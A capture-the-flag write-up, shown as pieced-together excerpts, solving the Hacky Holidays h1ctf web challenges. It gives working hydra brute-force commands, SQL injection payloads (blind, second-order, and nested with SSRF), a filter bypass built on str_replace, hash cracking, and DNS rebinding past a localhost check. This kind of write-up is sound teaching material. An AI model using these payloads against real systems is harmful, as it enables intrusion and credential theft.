So then I started trying some default creds like grinch:admin, admin:password ,etc they didn't worked. Then I tried for sqli that also didn't worked there was no difference in the response upon inputting a single quote in the username \u0026 password field.\n\n\nThe error mssg which was shown when we provided the wrong creds was : *Invalid Username*\nHere we might be able to guess the correct username, as the application might give an error like *Invalid Password* upon providing a valid username.\n\nI used hydra tool for this purpose: (wordlist was taken from seclist)\n\n**Enumerating valid username:**\n\n\u003ehydra -L 10k-most-common.txt -p \"sudi\"  hackyholidays.h1ctf.com  https-post-form \"/secure-login:username=^USER^\u0026password=^PASS^:Invalid Username\"\n\nOutput: valid username found *access*\n\n{F1119482}\n\n\n**Enumerating valid password:**\n\n\u003ehydra -P 10k-most-common.txt -l \"access\"  hackyholidays.h1ctf.com  https-post-form \"/secure-login:username=^USER^\u0026password=^PASS^:Invalid Password\"\n\nOutput: valid password found for username *access*: computer\n{F1119483}\n\nLet's get login to the website `access:computer`\nAfter getting login, we get the following page\n \n{F1119497}\n\nNo flag ahh, need to dig a little more.

It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?\"*\n\nWe need to hack into grinch diary's!!\n\nUpon opening the challenge page https://hackyholidays.h1ctf.com/my-diary we are redirected to this endpoint https://hackyholidays.h1ctf.com/my-diary/?template=entries.html\n\nIn this screenshot you could see the Grinch's Diary\n{F1131118}\n\n\nI started with replacing the template parameter value as it might be vulnerable to lfi attack, replacing it to index.html didn't worked so I tried index.php and in the source page I was able to get the index.php source code.\n\nhttps://hackyholidays.h1ctf.com/my-diary/?template=index.php\n\n```php\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\n\nBehind the scenes the provided filename existed on the server then the content of the file was shown back to the user with the *file_get_contents* function, if the application was using *include* Statement instead of file_get_contents then we would have chance of hoping to get an rce if somehow we can control the contents of the file.\n\nMoving on to the comments , so we need to look at the secretadmin.php file as admin.php has been removed *for more security* :)\n\nChanging the value to `?template=secretadmin.php`\nRedirects us to the /my-diary/?template=entries.html endpoint again ,due to the use of str_replace function on our input it stripping words from our input for eg:\n\n```php\n$page = str_replace(\"admin.php\",\"\",$page);\n$page = str_replace(\"secretadmin.php\",\"\",$page);\n```\n\nThe $page parameter contains our input, for eg: if we input something like: secretadmin.php\nAfter the first line execution $page will equal to \"secret\", \"admin.php\" part will be replaced with \"\"\n2nd line replaces any occurence of \"secretadmin.php\" to \"\".\n\nAlso one thing to note is that str_replace is used two times here and it's not done in a recursive way which might cause some issues.\n\nOur end goal is to provide an input like that which even after the replacements still comes out as secretadmin.php.\nFor eg: secretadminsecretadminadmin.php.php.php\n\n```php\n$page = str_replace(\"admin.php\",\"\",\"secretadminsecretadminadmin.php.php.php\");\n//=\u003e secretadminsecretadmin.php.php \n```\n\nsecretadminsecretadmin{admin.php}.php.php\nThe part inside {} was replaced with \"\" so we end up with  secretadminsecretadmin.php.php\n\nNow the 2nd replace function will be called\n\n```php\n$page = str_replace(\"secretadmin.php\",\"\",\"secretadminsecretadmin.php.php\");\n// =\u003e secretadmin.php \n```\n\nsecretadmin{secretadmin.php}.php\nThe part inside {} was replaced with \"\" so we end up with  secretadmin.php \n\nPretty sweet!!\n\nhttps://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php\n\nAnd we got the flag :)\n\nOne more interesting thing I could have tried accessing the secretadmin.php directly by visiting this url: https://hackyholidays.h1ctf.com/my-diary/secretadmin.php\n\nBut this error was shown:\n\n```\nYou cannot view this page from your IP Address\n```\n\nI tried to bypass this by using serveral X-* headers like X-Forwarded-For: 127.0.0.1 but none of them worked.\n\nThe reason for this was this:\n\n```php\n$_SERVER[\"REMOTE_ADDR\"] == '127.0.0.1'\n```\nIf the application was using this code, then we would have been able to get the flag by adding the header itself: \n\n```php\n$_SERVER['HTTP_X_FORWARDED_FOR']\n```\n\n\n6th flag done: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n**Day 7**\n\nOur Today task was: *Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!*\n\nWe can visit the challenege at this page: https://hackyholidays.h1ctf.com/hate-mail-generator/, on this page a campaign already running *Guess What* , looking more into https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030\n\nHere in this markup field you can see they are using templates:\n\n{F1131661}\n\nAs there is option to create new campaigns let see it first, when we click on the *Generate* button we get this error \n\n*Sorry but you've run out of credits*\n\nSo we might be not able to create any campaign but we can preview our email message by clicking on the *Preview button*\nThis request is made when we click on the *Preview* button\n\n\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 90\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/hate-mail-generator/new\nUpgrade-Insecure-Requests: 1\n\npreview_markup=Hi,{{name}}\u0026preview_data={\"name\":\"Shirley\",\"email\":\"alice@test.com\"}\n```\n\nResponse:\n\n```\nHi,Shirley\n```\n\nI tried adding something like {{7*7}} in the  preview_markup parameter but in the response.we get this error mssg \"Missing key 7*7 in dataset\"\n\nLooking again at the grifin campaigns:\n\n```\n{{template:cbdj3_grinch_header.html}} Hi {{name}}.....

He keeps his best posts in the Admin section but you'll need a valid login to access that!\"*\n\nGet access to the Admin section of the forum. Let's start ,this one was really hard.\nChallenge was accessible at this endpoint: https://hackyholidays.h1ctf.com/forum\n\n{F1131120}\n\nHere we can see three posts have been made \n\n1. Why I hate Christmas (By grinch)\n2. Nice Things To Do (which is empty no comments)\n3. Admin Section (which can only be viewed by the Admin)\n\nFrom the first post we can see the comments made by two users which are *grinch* and *max*.\nThere is a login panel for the forum: https://hackyholidays.h1ctf.com/forum/login\n\nBut we are not provided with any creds ,although we some potential valid usernames which we found from a post. I tried using hydra to see if it's possible to do the same like we did in an earlier challenege.\nBut no valid creds were found for both users.\n\nThe forum posts had path like this: \n\n```\nhttps://hackyholidays.h1ctf.com/forum/2\nhttps://hackyholidays.h1ctf.com/forum/1\nhttps://hackyholidays.h1ctf.com/forum/1/1\n```\n\nSo I decided to see if I can find any other post by incrementing the numbers: /forum/FUZZ and for /forum/1/FUZZ (from 0 to 1337), but no results  were found. Then I moved to content discovery.\n\n\u003effuf -w -u https://hackyholidays.h1ctf.com/forum/FUZZ\n\nI was able to find another valid endpoint: /phpmyadmin, I tried defaults creds for this but they also didn't worked.\nAs everything seemed like a dead end, github recon might be come in use at this place.\n\nWell as we know the author of this ctf challenges is Adam Langley, lets check his github profile.\n\nhttps://github.com/adamtlangley\n\nYou can see in this contribution section: Grinch-Networks/forum\n\n{F1131121}\n\nIs our target now: https://github.com/Grinch-Networks/forum\nThe most interesting file here  is the DB.php here: https://github.com/Grinch-Networks/forum/blob/main/models/Db.php, as it has keywords like user,pass but I couldn't find any creds from here. I then checked the commit history and found one with the commit message \"small fix\"\n\nhttps://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae\n\n{F1131122}\n\nThis is what we were looking for: forum:6HgeAZ0qC9T6CQIqJpD (user:pass)\nI then went to the login portal, at first tried this creds in the forum login it didn't worked, then on the phpmyadmin it worked :)\n\nFrom here I was able to find the username and md5 password hash.\nI went to crackstation.net, found the plaintext password: BahHumbug for the user grinch.\n\nWas able to then successfully login into the forum login, and from there found the flag.\n\n\n8th flag done: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`\n\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n**Day 9:**\n\nOur today's task was: *Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!*\n\nLet's take the quiz and see what else is there.\nThe challenge url is: https://hackyholidays.h1ctf.com/evil-quiz/\n\nBefore starting the quiz we have to provide our name, let's enter \"test\" and continue, on the next page we have to give answer for 3 questions, click on finish button and then you will be on the score page.\n\n{F1131124}\n\nAs I saw our provided name was reflecting on the score page, I tried for xss . There was also an admin login page so I was thing there might a bxss vulnerability. But later I found that xss is not possible here.\n\nI started the quiz again this time use this payload as the name: test'  (single quote to check for sqli), nothing happend there. But on the score page I could see something was strange.\n\nInput:\n\n```\nname: test\nThere is 7 other player(s) with the same name as you!\n\nname: test'\nThere is 0 other player(s) with the same name as you!\n\n\n``` \nI realised this might be a second order sql injection (as there wasn't any change in the response on the page where we provided our input but later on a different page we could see that the response has some changes).\nThen I tried with some more payloads(to fix the query ):\n\n```\n\nname: test''\nThere is 0 other player(s) with the same name as you!\n\nname: test'--\nThere is 0 other player(s) with the same name as you!\n\nname: test'--+\nThere is 0 other player(s) with the same name as you!\n\nname: test'#\nThere is 6 other player(s) with the same name as you!\n```\n\nSo by using # (it is used as a commnet in mysql), I was able to fix the query.\nTo confirm sqli was there, I tried \n\ntest' and 1=2# //Returns false so 0 players matched\ntest' and 1=1# //Returns true so 6 players matched\n\n\nFrom this blog , https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap , we could see that we can use sqlmap to exploit this 2nd order sqli.\n\n```bash\nsqlmap -u \"https://hackyholidays.h1ctf.com/evil-quiz\"  --data \"name=test\" -p \"name\" --method POST --second-url \"https://hackyholidays.h1ctf.com/evil-quiz/score\" --cookie=\"session=TokenHere\"\n```\n\nBut sqlmap didn't worked for me, so I moved try to do the sqli manually.\nI started with using order by clause and found there are 4 columns in the table, but I was not able find the vulnerable column so I left the union based way.\n\n```\ntest' order by 4#\ntest' union select 1,2,3,4#\n\n```\n\nCharacter by character I first exracted the table name:\n\n```\ntest' and Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=0#\n\nResult:\nadmin\n```\n\nThen extracted the column_name\n\n```\nname=admin' and Ascii(substring((Select+concat(column_name)+from+information_schema.columns+where+table_name=0x61646d696e+limit+0,1),1,1))=0#\n\nResult: found 3 columns under admin table\nid, username, password\n\n```\n\nThen getting the password took too much time as it was having special characters and numbers in it too.\n\n```\ntest' and Ascii(substr((select+concat(password)+from+admin+limit+0,1),1,1))=83#\n\nResult:\nS3creT_p4ssw0rd-$\n\n```\n\ntook a wild guess for the username \"admin\", tried this creds in the login panel and they worked.\n\nUsed this creds `admin:S3creT_p4ssw0rd-$`  here https://hackyholidays.h1ctf.com/evil-quiz and got the flag.\n\n\n9th flag is here: ` flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`\n\n\n------------------------------------------------------------------------------------------------------------------------------------------------\n\n**Day 10**\n\nThe challenges description says : *You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!*\n\nChallenge url:https://hackyholidays.h1ctf.com/signup-manager/\n\nWe have login form on the left side of the page and a signup form on the right.\n\n{F1131125}\n\nFilling the signup form details , then upon login into the site we get the following message : *We'll have a look into you and see if you're evil enough to join the grinch army!*\n\nAge field has a drop down in which we can choose age from 1 to 100+ (probably something migt be there)\n\nComing back at the challenge url and checking the source we can see a html comment: \u003c!-- See README.md for assistance --\u003e\n\nhttps://hackyholidays.h1ctf.com/signup-manager/README.md\n\n```\n\n# SignUp Manager\n\nSignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.\n\n### How to Install\n\n1) Create a directory that you wish SignUp Manager to be installed into\n\n2) Move signupmanager.zip into the new directory and unzip it.\n\n3) For security move users.txt into a directory that cannot be read from website visitors\n\n4) Update index.php with the location of your users.txt file\n\n5) Edit the user and admin php files to display your hidden content\n\n6) You can make anyone an admin by changing the last character in the users.txt file to a Y\n\n7) Default login is admin / password\n```\n\nTried the default login to see if I can get any more information or not, but I got the same response as I got before.\n\nDid some content discovery using ffuf found this endpoint:\n\n```\nREADME.md\nadmin.php\nuser.php\n```\n\nWhen I tried to access the admin.php,user.php endpoint the following error is shown *You cannot access this page directly*\nAfter some time I read the README.md file again this time with more attention , I didn't tried this endpoint /signupmanager.zip I realised.\n\nhttps://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip, unzip the zip file and now I have access to all the source code :)\nI also check whether I can find the user.txt , but couldn't find it at this url https://hackyholidays.h1ctf.com/signup-manager/user.txt\n\nWhen I saw this line of code in the index.php (use of substr), I thought Truncation vulnerability might be there which will allow me to re register again with an username which is having admin priveleges.\n\n```php\n$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"username\"]), 0, 15);\n```\n\nBut I was wrong I realised it later, due to the use of preg_replace, if there is anything other than alphabets, numbers in the username it will get replace with ''.\n\nLooking more into the code and getting an understanding of it I undertood what I needed  to do.\n\nAfter we had provided the inputs like username,password,age,lastname,firstname . The  addUser function is called and this values are passed along with it, this function is only called when there is no error. If there is any error like Username already exists,etc then it will display the error to the user.\n\n```php\n$cookie = addUser($username, $password, $age, $firstname, $lastname);\n\n```\n\naddUser function:\n\n```php\nfunction addUser($username,$password,$age,$firstname,$lastname){\n    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date(\"U\").microtime().rand() );\n    $line = '';\n    $line .= str_pad( $username,15,\"#\");\n    $line .= $password;\n    $line .= $random_hash;\n    $line .= str_pad( $age,3,\"#\");\n    $line .= str_pad( $firstname,15,\"#\");\n    $line .= str_pad( $lastname,15,\"#\");\n    $line .= 'N';\n    $line = substr($line,0,113);\n    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);\n    return $random_hash;\n}\n```\n\nContents of user.txt after this function is called.\n\n```\nusername#######5f4dcc3b5aa765d61d8327deb882cf99a352e06df699483aa1d6c05a5ab66a05100firstname######lastname#######N \n\n```\nThe length of this long string is truncated to 113, as you can see here $line = substr($line,0,113);\nThis is responsible for differentiating a normal user and a admin user: $line .= 'N';\n\nIn that long string you can see 'N' is there at the last which means not ADMIN, if there was Y it means ADMIN user.\n\nThe idea which came in my mind was, if I can provide a larger length value for one of the inputs and increase the length of the $line variable to something more than 113, so when this line is executed substr($line,0,113) it will also remove 'N' from the last. \n\n15 (username) + 32 (randomhash) + 32 (password) + 3 (age) + 15 (firstname) + 15 (lastname) + 1 (admin Y/N)= 113 \n\nrandomhash and password are md5 hashes no matter how long password I provide it's length is going to be 32 only.\nUsername,firstname,lastname all have same length\n\n```php\n$username =  substr(preg_replace('/([^a-zA-Z0-9])/', '', $username), 0, 15);\n$firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $firstname), 0, 15);\n$lastname =  substr(preg_replace('/([^a-zA-Z0-9])/', '', $lastname), 0, 15);\n```\n\nOnly the $age variable seems interesting target for us:\n\n```php\nif (!is_numeric($_POST[\"age\"])) {\n\n    $errors[] = 'Age entered is invalid';\n}\n\nif (strlen($_POST[\"age\"]) \u003e 3) {\n\n    $errors[] = 'Age entered is too long';\n}\n\n$age = intval($_POST[\"age\"]);\n\n```\n\nLookin at the intval functions docs https://www.php.net/manual/en/function.intval.php\n*It gets the integer value of the variable*\n\nIn the eg codes: \n\n```php\necho intval(1e10);                    // 1410065408\n```\n\nThis looked very interesting, the provided exponent number length was only 4 , but what was assign to the variable was 1410065408 whose length is 10.

Made some changes like replacing/adding other numbers/alphabets into it then also same error.\nI thought we can bruteforce these hashes and when I generated the wordlist the size went over 1GB so forget about it.\n\nLooking at the image location: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9\n\nA base64 token we can see here in the data parameter:\n\n```json\n{\n  \"image\": \"r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg\",\n  \"auth\": \"bbf295d686bd2af346fcd80c5398de9a\"\n}\n```\nSo the image path was something like this: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg  \n\nIf I directly access it *Image cannot be viewed directly*, this error is shown.\n\nPlaying with image value: \n\n```\n\"image\": \"r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg\"\n\nr3c0n_server_4fdk59/uploads/../../xxxx\nr3c0n_server_4fdk59/uploads/someOtherImage.jpg\n```\nEverytime I made changes to the image value , *invalid authentication hash* error was shown.\n\n\n2) API endpoint\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/\n\n{F1131138}\n\nHere we are given the status codes and their Explanations.\nUsing ffuf to find any api endpoint which we can access: \n\n\u003effufy -w ~/dirsearch/db/dicc.txt  -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/FUZZ  \n\nLater I found that every endpoint is giving *401 Unauthorized* response with the message : *\"This endpoint cannot be visited from this IP address\"*\n\n```\n/api/xxxxxxxxxxxxxxxxxxxxx   401\n/api/user                    401\n/api/v1                      401\n....\n```\nSo from this tests I came to the conclusion that content discovery on this api endpoint wouldn't be possible.\n\n3) Login Portal\n\nIt was available at this endpoint: https://hackyholidays.h1ctf.com/attack-box/login\n\n{F1131140}\n\nStarted with sqli injection as no errors were found, tried some common default passwords. Then I decided to use ffuf to find any endpoint I can have access to without login, no  endpoint was found.\n\nAs everything seemed like a dead end I started again with the Album part as it offer much more things. \nLast time we didn't tried to see if the hash parameter was vulnerable to sqli or not. Using sqlmap I found out it's vulnerable to Union based sqli.\n\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k         200OK\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'        404\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'--      404  \nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'--+-    200OK \n\n```\n\nFrom the database dump there wasn't anything which can be of some use. The current database user also didn't have any privileges , then I got a hint from my friend \"Inception\" ~sql injection inside sql injection \n\n\n```\nhash=-jdh34k' union select \"1'\",2,3--+-          404\nhash=-jdh34k' union select \"1'--+-\",2,3--+-      200ok\n\n...\n.....\nhash=-jdh34k' union select \"1' union select 1,2,3--+-\",2,3--+-\n```\nSomething strange I saw on the page when I tried the last query above, see that broken image(It appeared only when I added the 2nd union statement):\n\n{F1131633}\n\nThis was the image url: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==\n\n```json\neyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==\n\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/3\",\"auth\":\"fea7507478aa8225c022527b1763fb33\"}\n```\n\nYou see that \\/3 at the last , it is something new.After some time I realised it that that's the vulnerable column.\nThis time used this payload: `hash=-jdh34k' union select \"1' union select 1,2,version()--+-\",2,3--+-`\n\n```json\neyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzguMC4yMi0wdWJ1bnR1MC4yMC4wNC4zIiwiYXV0aCI6IjAzZDJiYzk3YTU4ZGMxNWM0ZWFmNWQ0ZmEyZDlmOTNkIn0=\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/8.0.22-0ubuntu0.20.04.3\",\"auth\":\"03d2bc97a58dc15c4eaf5d4fa2d9f93d\"}\n```\n\nOne more thing which I want to add is that the image link response had this message *Expected HTTP status 200, Received: 404*, the 404 status code were for this endpoint `r3c0n_server_4fdk59\\/uploads\\/8.0.22-0ubuntu0.20.04.3` as there is no endpoint with that name of the server it gave 404. Also the auth value is changing as per the image value.\n\n.................... Still I had no idea what to do next\n\nDirectory traversal to access the /api/* endpoints, remember the error which was shown by those api endpoints \"Invalid client IP\",let's try to access this endpoint from here.\n\n```\nhash=-jdh34k' union select \"1' union select 1,2,'../api'--+-\",2,3--+-\n\nResponse: Invalid content type detected\n```\n\nNow the server was making request to this endpoint: r3c0n_server_4fdk59/uploads/../api -\u003e r3c0n_server_4fdk59/api\nSo a valid endpoints response is \"Invalid Content type\" and for an invalid \"404\"\n\nNow onto enumerating some api endpoints:\n\n```\nhash=-jdh34k' union select \"1' union select 1,2,'../api/user'--+-\",2,3--+-\nResponse: Invalid content type detected\n\nParameters???\n\nhash=-jdh34k' union select \"1' union

can visit this url for more info: https://www.w3schools.com/sql/sql_wildcards.asp\nWe can use %,_ to find the correct password and username combination.\nI first used the _ to count the length of the username and password then with % extracted the chars one by one.\n\n\n```\nhash=-jdh34k' union select \"1' union select 1,2,'../api/user?username=%\u0026password='--+-\",2,3--+-\nInvalid content type

1,2,'../api/user?username=a%\u0026password='--+-\",2,3--+-\nExpected HTTP status 200, Received: 204\n\n```\n\nThe username starts with \"g\", so it's probably grinch.\n\n```\nhash=-jdh34k' union select \"1' union select 1,2,'../api/user?username=grinch%\u0026password='--+-\",2,3--+-\nInvalid content type detected\n\nhash=-jdh34k' union select \"1' union select 1,2,'../api/user?username=grincha%\u0026password='--+-\",2,3--+-\nInvalid content type detected\n\nLet's check what the last charcater might be:\nhash=-jdh34k' union select \"1' union select 1,2,'../api/user?username=%n\u0026password='--+-\",2,3--+-\nInvalid content type detected\n\ngrincha%n maybe it's admin??\nhash=-jdh34k' union select \"1' union select 1,2,'../api/user?username=grinchadmin\u0026password='--+-\",2,3--+-\nInvalid content type detected\n\nUsername: grinchadmin\n\n```\n\nMoving on to the password parameter.\n\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nfrom sys import argv\n\nscript, length = argv\npassword = \"\"\n\npasswords = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',

finally had the password also: s4nt4s_c__\nWhen I tried this creds `grinchadmin:s4nt4s_c__` on the attack-box login portal, it was showing Wrong credentials, so I replaced the _ in the password , the correct password was: s4nt4sucks\n\n{F1131143}\nNow we are logged in\n\n11th flag:

were found in the response.\n\nAs this was similar to what we saw in earlier challenge `{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"} `, this challenge is probably about ssrf.\nAny change made in the target's value shows *Invalid Protection Hash*\n\n\nHere you could see a hint was shared by hackerone: https://twitter.com/Hacker0x01/status/1342545650789978112?s=20\n\n{F1131630}\n\n\nHint: \"Salt\" \n\nSalted hash?\n\nThe application probably generated this hashes something like this:\n\n```php\nmd5(\"someSecretString\".\"203.0.113.33\");\n```\n\nSo our goal will be to find that \"someSecretString\", I decied to use hashcat to crack these using rockyou wordlist.\n\n```bash\n\u003ecat hashes\n5f2940d65ca4140cc18d0878bc398955:203.0.113.33\n//(hash:salt)\n\n\u003ehashcat -a 0 -m 10 hash rockyou.txt --force\n\u003ehashcat -a 0 -m 10 hash --force --show \n5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463 \n\n```\n\nmrgrinch463, we got the secret. Let's verify it and it matches with the hash value:\n\n```php\nphp \u003e echo md5(\"mrgrinch463\".\"203.0.113.33\");\n5f2940d65ca4140cc18d0878bc398955\n```\nSo now we can make the application to make requests to any IP we want. Whatever IP is provided to the application it launches attack against by making the targeting IP down, so if we somehow managed to attack the appliction's IP itself we can stop grinch and save the Christmas.\n\nBut as you know things aren't as simple as they look like.\nThere is filter which checks whether the target IP  resolves to the local ip or not, if it's local Ip for eg: like 127.0.0.1 it' aborts the attack.\n\nHere in the screenshot you can see the message\n\n{F1131629}\n\n0.0.0.0 seemed to have worked but nothing was changed it was normal as when I was trying with other IPs like 203.0.113.33, other bypasses like 127.1,0,etc didn't worked.\nAlso only -. characters other than numbers were allowed in the target's value, if for eg: I provided an IP like this \"127.0.0.1]\", it was showing an error *Invalid Characters Detected*\n\nAs nothing seemed to work, my friend told me to look into dns rebinding.\n\nI never tried this before so read some writeups ,to get a basic understanding of it.Then I found this repo: https://github.com/taviso/rbndr\nand used it \n\n7f000001.08080808.rbndr.us (the hostname generated will resolve randomly to one of the addresses specified with a very low ttl)\nThe two IP which I specified was 127.0.0.1 and 8.8.8.8\n\nNow using this as the IP\n\n```json\n{\"target\":\"7f000001.08080808.rbndr.us\",\"hash\":\"00830ee7e57f7d81ce889bd12a7cb0bd\"}\n```\n\nI was able to complete the challenge\nHere is the flag page:\n{F1131626}\n\nFinal flag:
